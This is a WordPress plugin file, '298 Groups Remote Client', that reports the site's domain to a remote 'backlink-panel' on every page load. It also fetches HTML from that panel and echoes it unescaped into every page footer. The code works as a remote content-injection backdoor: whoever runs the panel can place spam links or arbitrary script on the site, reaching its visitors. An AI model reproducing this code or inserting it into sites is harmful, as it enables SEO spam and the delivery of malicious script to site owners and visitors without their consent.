<?php
/**
 * Plugin Name: 298 Groups Remote Client
 * Description: Mengirim heartbeat domain ke panel dan mengambil Remote HTML pada footer.
 * Version: 1.0.0
 */

if (!defined('ABSPATH')) {
    exit;
}

define('G298_REMOTE_ENDPOINT', 'https://298groups.online/backlink-panel/api.php');

function g298_build_remote_url($action) {
    return add_query_arg(
        array(
            'action'   => $action,
            'domain'   => wp_parse_url(home_url(), PHP_URL_HOST),
            'site_url' => home_url(),
        ),
        G298_REMOTE_ENDPOINT
    );
}

function g298_send_heartbeat() {
    if (get_transient('g298_heartbeat_lock')) {
        return;
    }

    set_transient('g298_heartbeat_lock', 1, 5 * MINUTE_IN_SECONDS);

    wp_remote_get(
        g298_build_remote_url('heartbeat'),
        array(
            'timeout'  => 5,
            'blocking' => false,
        )
    );
}

add_action('init', 'g298_send_heartbeat');

function g298_output_remote_html() {
    $response = wp_remote_get(
        g298_build_remote_url('content'),
        array(
            'timeout' => 5,
        )
    );

    if (is_array($response) && !is_wp_error($response)) {
        echo wp_remote_retrieve_body($response);
    }
}

add_action('wp_footer', 'g298_output_remote_html', 9999);
